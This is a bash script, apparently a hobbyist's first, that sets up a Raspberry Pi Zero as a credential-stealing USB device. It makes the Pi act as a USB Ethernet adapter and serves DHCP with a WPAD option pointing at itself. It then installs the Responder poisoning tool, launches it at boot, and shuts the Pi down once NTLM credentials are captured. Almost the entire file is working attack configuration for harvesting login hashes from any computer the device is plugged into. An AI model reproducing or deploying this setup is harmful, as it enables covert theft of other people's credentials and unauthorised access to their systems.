#!/bin/bash
# This is my first script and it is called "PiSponder"
# Please tell me what I can improve upon
# This script will only work on the Raspberry Pi Zero

if [ $EUID -ne 0 ]; then
	echo "You must use sudo to run this script:"
	echo "sudo $0 $@"
	exit
fi

apt-get update

## Setup the PiZero to look like a USB to Ethernet
cd /boot
sed -i -r -e 's/(rootwait)/\1 modules-load=dwc2,g_ether/' cmdline.txt
sed -i -e "\$adtoverlay=dwc2" config.txt

## Configure static IP for usb0
cat <<'EOF'>>/etc/network/interfaces

auto usb0
allow-hotplug usb0
iface usb0 inet static
    address 192.168.200.1
    netmask 255.255.255.0
EOF


##Install and configure dnsmasq
 apt-get install -y dnsmasq


cat <<'EOF'>>/etc/dnsmasq.conf

interface=usb0
dhcp-range=192.168.200.2,192.168.200.254,255.255.255.0,1h

dhcp-authoritative

dhcp-option=252,http://192.168.200.1/wpad.dat

log-queries
log-dhcp

port=0
EOF

##Install Responder and dependencies
apt-get install -y python git python-pip python-dev screen sqlite3 inotify-tools
pip install pycrypto
git clone https://github.com/spiderlabs/responder


##Start Responder at bootup
cat <<'EOF'>>/etc/rc.local

# Start Responder
/usr/bin/screen -dmS responder bash -c 'cd /root/responder/; python Responder.py -I usb0 -f -w -r -d -F' 
EOF

## Stop Responder when its done grabbing NTLM creds and shut down PiZero
## Comment out this part out if you don't want it to shut down the PiZero after it gets the creds
cat <<'EOF'>>/etc/rc.local

# Shutdown once creds have been obtained
/usr/bin/screen -dmS notify bash -c 'while inotifywait -e modify /root/responder/Responder.db; do shutdown -h now; done' 
exit 0
EOF
